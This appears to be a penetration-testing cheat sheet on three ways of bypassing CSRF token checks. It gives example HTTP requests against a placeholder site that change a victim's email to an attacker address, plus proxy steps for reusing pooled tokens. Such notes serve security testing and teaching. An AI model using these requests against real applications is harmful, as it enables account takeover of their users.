If the session cookie’s SameSite value is set to none and the `referer` header is not being used for CSRF protection, then there is probably a CSRF token in place. The following are common CSRF token bypasses.

#### Request Method

Sometimes the CSRF token is only being validated in a POST request, you should also try to send the request as a GET request. 

```
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```

#### Remove CSRF Token

Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net~~&csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY~~
```

#### CSRF Token Pool

Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

```
1. Capture a CSRF attack POST request
2. Send request to repeater
3. Drop the request (dropping the request means the CSRF token will not be used, meaning the token is still in the CSRF token pool)
4. Create a CSRF PoC
5. Use the CSRF token in the repeater tab in the CSRF PoC
```
